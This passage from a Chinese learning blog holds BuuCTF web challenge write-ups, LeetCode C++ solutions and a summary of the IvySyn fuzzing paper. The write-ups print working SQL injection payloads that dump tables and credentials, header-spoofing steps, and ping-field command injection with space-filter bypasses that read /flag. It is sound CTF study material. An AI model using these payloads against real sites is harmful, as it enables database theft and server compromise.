<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ee2e800-9f8e-4e3c-84cd-74cc042130f7" alt="image"></p>
<p>爆表名password&#x3D;<code>1&#39; union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/46fefaef-3e5b-4e25-879b-fe8d90e6a190" alt="image"></p>
<p>爆出表名为geekuser</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f86dda2c-490c-4565-9987-7debf9b563fc" alt="image"></p>
<p>爆表名password&#x3D;<code>1&#39; union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/91e3ddbc-4172-46a3-bd4a-8475672d22ae" alt="image"></p>
<p>爆出表名为l0ve1ysq1</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/48fad51e-7c1d-46c2-a62f-70096f1911b0" alt="image"></p>
<p>爆列名password&#x3D;<code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39; #</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d75cf913-a8ff-42bc-a889-2520f7034e8a" alt="image"></p>
<p>id,username,password</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d4322e73-777f-41f7-a80d-216f16b92262" alt="image"></p>
<p>爆数据：<code>/check.php?username=1&amp;password=1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8f190d3d-18db-46dd-a153-14c2629ab419" alt="image"></p>
<p>查看源代码，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/847ee93b-2338-46f3-bd64-75dd2af16945" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7904eee7-45b3-4f8b-8eac-ecab975dac71&#125;</span><br></pre></td></tr></table></figure>

<h4 id="11、Http"><a href="#11、Http" class="headerlink" title="11、Http"></a>11、Http</h4><p>查看页面源代码，发现有个Secret.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/fc1e582e-da71-41e3-ae68-398440843c32" alt="image"></p>
<p>查看该文件，有一个网址</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c8fae7de-4638-4717-894c-194b9ff5d21d" alt="image"></p>
<p>提示：It doesn’t come from ‘<a target="_blank" rel="noopener" href="https://www.sycsecret.com’,就是说这个页面得来自https//www.Sycsecret.com%EF%BC%8C%E6%B7%BB%E5%8A%A0referer%E5%8D%B3%E5%8F%AF">https://www.Sycsecret.com’，就是说这个页面得来自https://www.Sycsecret.com，添加referer即可</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer头用于告诉web服务器，用户是从哪个页面找过来的</span><br></pre></td></tr></table></figure>

<p>添加<code>Referer:https://www.Sycsecret.com</code>，send，提示Please use “Syclover” browser：请使用“Syclover”浏览器</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/06269527-d670-4189-8c9f-dc64374f0ec7" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent头用于告诉web服务器用户使用的浏览器和操作系统信息</span><br></pre></td></tr></table></figure>

<p>添加<code>User-Agent:Syclover</code>，send，提示No!!! you can only read this locally!!!：不! !您只能在本地阅读!!</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b1b7a270-fb3d-4019-b4e7-6e174ce633a5" alt="image"></p>
<p>添加<code>X-Forwarded-For:127.0.0.1</code>，send，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d6d19f27-7902-4f41-b3d7-741661d1f670" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;43a4b431-f334-44b4-bcb3-aadf626871ac&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/15/20240215/" data-id="clsmsqz4000002ovf03iiaxsq" data-title="20240215" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-20240214" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/14/20240214/" class="article-date">
  <time class="dt-published" datetime="2024-02-14T10:04:59.000Z" itemprop="datePublished">2024-02-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/14/20240214/">20240214</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h4><h5 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h5><p>使用暴力枚举，枚举数组中的每一个数 x，寻找数组中是否存在 target - x。</p>
<p>当我们使用遍历整个数组的方式寻找 target - x 时，需要注意到每一个位于 x 之前的元素都已经和 x 匹配过，因此不需要再进行匹配。而每一个元素不能被使用两次，所以我们只需要在 x 后面的元素中寻找 target - x。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">        vector &lt;<span class="type">int</span>&gt; v;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>()<span class="number">-1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;nums.<span class="built_in">size</span>();j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]+nums[j]==target)</span><br><span class="line">                &#123;</span><br><span class="line">                    v = &#123;i,j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h5><p>思路：</p>
<ul>
<li><p>将数字转换为字符串，并检查字符串是否为回文。但是，这需要额外的非常量空间来创建问题描述中所不允许的字符串。</p>
</li>
<li><p>将数字本身反转，然后将反转后的数字与原始数字进行比较，如果它们是相同的，那么这个数字就是回文</p>
</li>
</ul>
<p>我选择用循环，判断对称位的数是否相等</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(x&gt;=<span class="number">0</span> &amp;&amp; x&lt;<span class="number">10</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> n=<span class="built_in">ws</span>(x);</span><br><span class="line">            <span class="type">int</span> sz[n];</span><br><span class="line">            <span class="type">int</span> num=x;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                sz[i]=num%<span class="number">10</span>;</span><br><span class="line">                num=num/<span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n/<span class="number">2</span>;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(sz[i]!=sz[n-i<span class="number">-1</span>]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">ws</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            n++;</span><br><span class="line">            x=x/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="删除有序数组中的重复项"><a href="#删除有序数组中的重复项" class="headerlink" title="删除有序数组中的重复项"></a>删除有序数组中的重复项</h5><p>循环，删除重复项</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">removeDuplicates</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(i=len<span class="number">-1</span>;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]==nums[i<span class="number">-1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                nums.<span class="built_in">erase</span>(nums.<span class="built_in">begin</span>()+i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="BuuCTF"><a href="#BuuCTF" class="headerlink" title="BuuCTF"></a>BuuCTF</h4><h5 id="5、Exec"><a href="#5、Exec" class="headerlink" title="5、Exec"></a>5、Exec</h5><p>Linux ping 命令用于检测主机。执行 ping 指令会使用 ICMP 传输协议，发出要求回应的信息，若远端主机的网络功能没有问题，就会回应该信息，因而得知该主机运作正常</p>
<p>ls（英文全拼：list files）：用于显示指定工作目录下的内容（列出目前工作目录所含之文件及子目录)</p>
<p>cat（英文全拼：concatenate）：用于连接文件并打印到标准输出设备上</p>
<p>首先查看此文件的目录：127.0.0.1|ls</p>
<p>点击ping后发现有个index.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ed432b5-3a25-47e5-a5d8-fa4e3948b9ba" alt="image"></p>
<p>再查看上级目录：127.0.0.1|ls &#x2F;</p>
<p>点击ping后可以看到一个flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0d1134f8-a13d-495a-aee7-8cf77a4b70df" alt="image"></p>
<p>查看flag：127.0.0.1|cat &#x2F;flag</p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/82ff4a13-d4da-43e8-bc7e-9b7cf5acf0f9" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4504f6f2-191b-410b-b40d-18b4e403a271&#125;</span><br></pre></td></tr></table></figure>

<h5 id="6、Ping-Ping-Ping"><a href="#6、Ping-Ping-Ping" class="headerlink" title="6、Ping Ping Ping"></a>6、Ping Ping Ping</h5><p>这一题与上一题Exec类似，首先访问本地地址，发现有显示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/22516845-102d-4d83-b285-1b77da5f6ece" alt="image"></p>
<p>查看此文件的目录，发现有两个文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7d100ccc-5cf4-4e39-b61e-5cf2b2dc48f6" alt="image"></p>
<p>查看flag.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/4a1777df-77fb-4867-a0c5-6af4f22783c8" alt="image"></p>
<p>它说空格被过滤了</p>
<p>命令中空格被过滤的解决方法：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt: $IFS$9 $9指传过来的第9个参数</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg (\x20转换成字符串就是空格)</span><br></pre></td></tr></table></figure>

<p>发现符号又被过滤了，说明<code>&#123;&#125;</code>大括号被过滤了</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/edc798c1-1d33-40e5-ba2d-3044ba3e2d10" alt="image"></p>
<p>用另一个方法试下index.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/614c2964-8a82-41be-b50c-51b4d29bc50e" alt="image"></p>
<p>有一个参数a，<strong>变量拼接字符串——将a的值覆盖，然后进行绕过</strong></p>
<p>构造payload：<code>/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p>
<p>用变量拼接成flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1db4f885-23d5-40b5-9d8a-291a10eae7f6" alt="image"></p>
<p>啥也没有，查看源代码，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8ea1b222-1b2e-420a-8a81-137e674b2caf" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;97aede41-9723-4901-8ac2-b345d66af44b&#125;</span><br></pre></td></tr></table></figure>

<h5 id="7、随便注"><a href="#7、随便注" class="headerlink" title="7、随便注"></a>7、随便注</h5><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1fe10469-06c6-4c22-87f0-1a3886b61577" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0cd3e27d-e133-4673-bcc7-2d008ce22b09" alt="image"></p>
<p>查询3时没有显示，说明有两个字段</p>
<p>爆数据库：1’;show databases;#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d0f5ed71-751c-4117-9195-f3178caa3dd2" alt="image"></p>
<p>爆表名：1’; show tables;#</p>
<p>出来了两个表</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f636bbac-e56c-4091-bf74-ebe0f39634cf" alt="image"></p>
<p>查看words表列名：1’; show columns from words;#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6bdf874f-d98f-49ee-a0e6-b5a1df7495b0" alt="image"></p>
<p>查看1919810931114514表列名：0’; show columns from <code>1919810931114514</code>;#</p>
<p>注意：表名为数字时，要用反引号包起来查询</p>
<p>看到flag，说明表1919810931114514中有flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1be25d80-699d-4449-981a-4ba85f3228b3" alt="image"></p>
<p>查看大佬的方法</p>
<ul>
<li><p>通过 rename 先把 words 表改名为其他的表名。</p>
</li>
<li><p>把 1919810931114514 表的名字改为 words 。</p>
</li>
<li><p>给新 words 表添加新的列名 id 。</p>
</li>
<li><p>将 flag 改名为 data </p>
<p>1’; rename table words to word1; rename table <code>1919810931114514</code> to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/595a5ad4-0393-4542-9b16-f32cd7633903" alt="image"></p>
</li>
</ul>
<p>最后输入：1’ or 1&#x3D;1;#</p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b2b3bcda-a630-4c63-a614-a68ba770a02a" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;aa75e48d-8389-408e-9c8c-9d30c81c432b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="8、EasySQL"><a href="#8、EasySQL" class="headerlink" title="8、EasySQL"></a>8、EasySQL</h4><p>输入1，有显示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/24aa574b-2e43-454e-8df1-8dbb3b104abd" alt="image"></p>
<p>爆数据库：1;show databases;#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0320260a-c0f9-4e36-b544-bb0ba53de8a0" alt="image"></p>
<p>爆表：1;show tables;#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ee2d1ebd-03b9-48f9-984f-10acee8da107" alt="image"></p>
<p>爆字段：1;show columns from FLAG;#</p>
<p>显示Nonono</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/faaaf7dd-fd3e-4fe1-8eb9-2c66d9b23046" alt="image"></p>
<p>查看大佬博客后，构造payload：*,1</p>
<p>参考博客（[BUUCTF-<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46918279/article/details/120188186">SUCTF 2019]EasySQL1__Monica_的博客-CSDN博客</a>）</p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9321cfe6-b625-4707-9703-8ecbdf5d1a9b" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7c0c6069-c1fe-4314-b793-9a214f11fdb3&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/14/20240214/" data-id="clsl9y38e0000usvf69u7b5aa" data-title="20240214" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Paper-IvySyn Automated Vulnerability Discovery in Deep Learning Frameworks" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/08/Paper-IvySyn%20Automated%20Vulnerability%20Discovery%20in%20Deep%20Learning%20Frameworks/" class="article-date">
  <time class="dt-published" datetime="2024-02-08T10:18:02.000Z" itemprop="datePublished">2024-02-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/08/Paper-IvySyn%20Automated%20Vulnerability%20Discovery%20in%20Deep%20Learning%20Frameworks/">IvySyn</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="IvySyn-Automated-Vulnerability-Discovery-in-Deep-Learning-Frameworks-论文分享"><a href="#IvySyn-Automated-Vulnerability-Discovery-in-Deep-Learning-Frameworks-论文分享" class="headerlink" title="IvySyn: Automated Vulnerability Discovery in Deep Learning Frameworks 论文分享"></a>IvySyn: Automated Vulnerability Discovery in Deep Learning Frameworks 论文分享</h3><p>Neophytos Christou, undefined., et al, “IvySyn: Automated Vulnerability Discovery in Deep Learning Frameworks,” in 32nd USENIX Security Symposium (USENIX Security 23), 2023, pp. 2383–2400.</p>
<p>pdf链接：<a href="">usenix.org&#x2F;system&#x2F;files&#x2F;usenixsecurity23-christou.pdf</a></p>
<p>IvySyn：自动发现深度学习框架中的漏洞</p>
<p>IvySyn是第一个用于发现深度学习框架中的内存错误漏洞的全自动框架，它会自动合成高级语言（如Python）中的代码片段</p>
<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>人工智能应用越来越广泛，深度学习（DL）一直走在人工智能技术的前沿。深度学习框架通常为模型开发人员提供一套丰富的高级应用程序接口，开发者可以通过这些接口执行特定的DL操作，但是这些操作的重要部分（内核）是用C&#x2F;C++等内存不安全语言实现的。因此DL框架底层实现存在漏洞，这些漏洞可能导致功能不正确、数值错误、性能下降、内存耗尽和CPU&#x2F;GPU&#x2F;TPU锁定，以及致命的的运行时和内存安全错误。</p>
<h4 id="现存的深度学习框架漏洞发现方法局限"><a href="#现存的深度学习框架漏洞发现方法局限" class="headerlink" title="现存的深度学习框架漏洞发现方法局限"></a>现存的深度学习框架漏洞发现方法局限</h4><p>过去了方法试图通过直接在高级应用程序接口上使用模糊处理来回答类似问题，但是是半自动或非自动的，需要领域专家注释来指定有效的参数-值组合，或者需要开发人员手动编写辅助代码。</p>
<h5 id="提出问题"><a href="#提出问题" class="headerlink" title="提出问题"></a>提出问题</h5><ol>
<li>在本地DL内核中，是否有低级应用程序接口的违规输入会引发内存错误？</li>
<li>是否有任何高级应用程序接口可以将上述违规输入传播到低级内核代码中？</li>
</ol>
<h4 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h4><ol>
<li>利用原生API的静态类型性质，这使本文能够在低级内核代码上执行基于类型感知突变的模糊</li>
<li>给定低级API的一组违规输入，本文利用从低级到高级API的固有DL框架映射，并合成代码片段，在低级、原生代码上触发内存错误，并将输入传递给高级API</li>
<li>设计并实现IvySyn，IvySyn框架中实现了本文自下而上的方法，它不需要域专家注释或手动编写的驱动程序代码</li>
</ol>
<h4 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h4><p><strong>内核</strong>：DL框架的核心功能由原生C&#x2F;C++代码提供，实现标准操作，如张量操作、数学、讨论和梯度计算、池化和其他DL特定操作。此类操作的实际本机实现称为内核。在C&#x2F;C++等语言中实现核心操作不仅提供了更好的性能，还允许框架开发人员为不同的硬件设备（例如CPU、GPU和TPU）提供多个优 化版本。内核被建议避免使用（或取决于）共享状态，每个调用都是自包含的，以便易于并行。这是IvySyn构建的一个重要属性，可以无缝添加其内核模糊钩子。</p>
<p><strong>绑定</strong>：即使DL框架提供低级内核API，模型开发人员通常通过Python等高级语言执行特定于DL的操作。因此，为了通过开发人员可访问的API公开这些操作的子集，DL框架生成高级绑定。这些绑定将喂给Python API的输入参数转换为相应的C&#x2F;C++参数，并透明地调用适当的内核，抽象出有关底层外函数接口的实现细节。IvySyn基于DL框架映射（绑定⇄内核）和低级崩溃输入，以无缝合成代码片段，包括各自的高级API。尽管这些绑定不一定打算由de-velopers使用，但它们仍然被公开曝光，并且可以从Python中调用，使攻击者能够直接访问本机内核实现中可利用的漏洞。</p>
<p><strong>高级API和DL模型</strong>：高级语言绑定（如上述）由其他特定于语言的高级API（例如，在Python中实现）进一步包装。在调用相应操作之前，后者可能会在原始绑定上添加一些抽象，例如参数的预处理或额外的健全性检查；或者可能只是包装器，向框架模块添加文档和统一导出操作。最终，围绕内核操作绑定的高级API是模型开发人员打算使用的API。我们称这些开发人员可访问和记录的API为高级API。通常，在为各种任务构建DL模型时，会使用多个此类高级API，例如自动驾驶汽车的图像分类[36]，恶意软件检测和人脸识别。测试深度学习框架。DL框架在其底层实现中存在错误，经验表明，此类错误可能会导致内存安全错误、致命的运行时错误、不正确或不一致的功能性、数值错误、性能下降、内存消耗和CPU&#x2F;GPU&#x2F;TPU锁定。原生、C&#x2F;C++、DL框架部分（例如内核）中的错误特别令人感兴趣，因为它们可能会导致致命的运行时错误和内存错误，并可能被攻击者滥用。</p>
<p><strong>内存错误</strong>：</p>
<p>IvySyn旨在发现触发以下内容的崩溃输入：</p>
<p>（a）内存安全错误，如（任意）内存损坏和内存泄露漏洞</p>
<p>（b）致命的运行时错误——（a）和（b）在模糊&#x2F;运行时期间表现为崩溃（即带有SIGABRT、SIGFPE和SIGSEGV异常的异常进程终止）。</p>
<h4 id="方法概述"><a href="#方法概述" class="headerlink" title="方法概述"></a>方法概述</h4><p>目标：发现安全漏洞</p>
<p>IvySyn利用基于突变的模糊测试和类型感知测试，实现发现本地DL内核中可能引发内存错误的违规输入。IvySyn会自动合成适当的代码片段，从高级应用程序接口触发相应的错误。</p>
<p>每一个可以触发内存错误的输入（代码片段）被称为“漏洞证明”（PoV），因为它正面内核代码中存在漏洞，可能导致内存损坏或泄露（违反完整性&#x2F;保密性），甚至停止整个DL框架的运行（违反可用性）。攻击者可以通过API触发漏洞。</p>
<h4 id="IvySyn框架"><a href="#IvySyn框架" class="headerlink" title="IvySyn框架"></a>IvySyn框架</h4><p>框架的设计遵循三个设计原则</p>
<ol>
<li>开发人员关于拓展DL框架的指令：便于识别本机API并为其添加适当的模糊钩子</li>
<li>挂钩没有共享状态的内核，使用开发人员测试来强制执行和模糊它们</li>
<li>利用高层和底层API之间固有的DL框架来合成PoV</li>
</ol>
<p>下图是IvySyn的整体架构</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/74ca5e10-38ab-485e-b509-1cec8155b9a5" alt="image"></p>
<p>IvySyn的仪器从各自的DL代码库中提取本机内核实现，以构建和注入模糊包装器。IvySyn的Watchdog调用开发人员测试套件的切入点；一旦ex-ecution的流到达目标内核，IvySyn的仪器将使用类型感知突变引导强制执行的基于突变的模糊会话。IvySyn的合成器使用模糊过程中发现的低级崩溃输入来生成PoV，这反过来又会触发来自公开可用API的低级内存错误。</p>
<p>要测试本机代码，IvySyn首先需要提取与DL框架内核对应的函数，然后在它们周围创建并注入适当的模糊包装器。</p>
<p><strong>Creating and Injecting Wrappers：</strong> 给定一组目标ker- nels，IvySyn创建并注入模糊包装器如下：首先，它将原始内核函数重命名，例如func()，改为do_func()；然后，它用包装代码替换原始函数的主体，初始化IvySyn模糊会话。</p>
<p>DL框架通常由多层结构组成，不会公开低级API（即内核）供直接使用。 图1的左侧，内核旨在被高级API暗示使用，高级API⇝绑定⇝内核。 因此，在没有适当的调用上下文（即在调用堆栈上活跃的特定功能链和一组正确初始化的全局变量）的情况下，直接模糊内核API将导致不正确的功能。</p>
<p>为了引导强制执行的模糊会话，IvySyn创建了一个看门狗进程，该进程运行开发人员提供的单元测试的入口点（例如，在TensorFlow的情况下，tf-tests&#x2F;*.py）。 在仪器期间，原始内核函数定义与IvySyn包装代码插入。 因此，一旦开发人员测试的执行到达仪器内核，它将启动一个“强制执行”的模糊会话。 这种方法可以无缝工作，因为强制执行的内核以适当的调用上下文调用，内核通常通过设计避免共享状态。 （与共享状态交互的内核目前被IvySyn忽略） 崩溃报告生成。 每个突变的投入组合都会被分配一个唯一的索引号（UIN）。 IvySyn将与当前突变输入组合对应的UIN记录到日志文件中，该日志文件以模糊的函数命名。 一旦发生崩溃，此日志文件将包含上次尝试输入组合的UIN，这是导致内存错误的UIN。 IvySyn利用这种形成来重新初始化模糊器，获取违规输入，并将崩溃报告拼接在一起，如Listing1所示。</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7740b05f-0700-4f55-91fc-bb4aaf47107e" alt="image"></p>
